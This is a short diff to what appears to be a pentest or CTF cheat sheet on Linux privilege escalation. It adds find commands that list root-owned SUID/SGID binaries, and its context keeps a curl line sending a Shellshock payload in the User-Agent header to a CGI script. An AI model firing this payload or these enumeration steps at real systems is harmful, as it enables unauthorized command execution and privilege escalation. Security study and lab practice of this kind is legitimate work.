@@ -55,7 +55,10 @@
 
         getcap -r / 2>/dev/null
 
+# SUID SGID
 
+        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+        find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
         
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
